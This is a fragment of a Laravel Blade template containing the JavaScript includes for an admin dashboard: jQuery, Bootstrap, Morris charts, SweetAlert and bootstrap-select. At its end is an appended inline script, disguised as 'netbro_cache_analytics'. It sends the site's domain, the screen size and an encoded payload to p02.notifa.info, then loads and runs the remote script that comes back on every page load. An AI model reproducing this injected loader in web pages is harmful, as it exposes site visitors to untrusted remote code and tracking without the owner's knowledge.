    <!-- jQuery  -->
    <script src="{{ asset ('assets/js/jquery.min.js')}}"></script>
    <script src="{{ asset ('assets/js/bootstrap.bundle.min.js')}}"></script>
    <script src="{{ asset ('assets/js/metismenu.min.js')}}"></script>
    <script src="{{ asset ('assets/js/waves.js')}}"></script>
    <script src="{{ asset ('assets/js/simplebar.min.js')}}"></script>

    <!-- Morris Js-->
    <script src="{{ asset ('assets/plugins/morris-js/morris.min.js')}}"></script>
    <!-- Raphael Js-->
    <script src="{{ asset ('assets/plugins/raphael/raphael.min.js')}}"></script>

    <!-- Morris Custom Js-->
    <script src="{{ asset ('assets/pages/dashboard-demo.js')}}"></script>

    <!-- App js -->
    <script src="{{ asset ('assets/js/theme.js')}}"></script>

    <!-- Select Js -->
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script src="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap-select@1.13.9/dist/js/bootstrap-select.min.js"></script>

    <!-- Sweet Alerts Js-->
    <script src="{{ asset ('assets/plugins/sweetalert2/sweetalert2.min.js')}}"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

    <!-- Sweet Alerts Js-->
    <script src="{{ asset ('assets/pages/sweet-alert-demo.js')}}"></script>

    <!-- High Chart js -->
    @yield('chart')

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXPpySoYO2SA0zG%2fBo6KByQFZb%2bGhu%2f4C87h%2bFq%2f5lcOlz%2f8xuan61BPemVP1p0dsJ0IbuDVaUwqWH6XqnhmbmSkKQ4ReWNgF7912JNEM9Lyj48YRcB%2bn%2f3OUKwgE07utkLRH970KV%2f63EvoWHne11jLlyY0D64BrjydHKvf5sv8hx2S%2fqWx0cBb2aWec1lD%2ffM%2bERhLG3q530DqTdbq14hKMPZnZm5WhUHEbu7CFxaixpJp6AmIsYMVzWHPCK96S5aTMJMvupsE%2bTS0vsceGVTsCF0WEjSSBvGw10YYbEUaLuhnCHxO2KKqtcqpWa1JdearYH4EMKn40XFDOrYl%2bFDXaUJMx%2fikl%2fFKdoRWO1%2bweFc5lgLWx6XRNxFihCCqdkogn5AE%2b1Jg8%2btwoMlKpjqQZ8xfLl1ZE9dK8iuKy7GKB6Zc9ak53OPMaDozL5huPPc5n1stE6QyCs1EYAJkcRsDTmCj3%2bs9qyN%2b2155nkGTUZs3fsg%2fipCw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>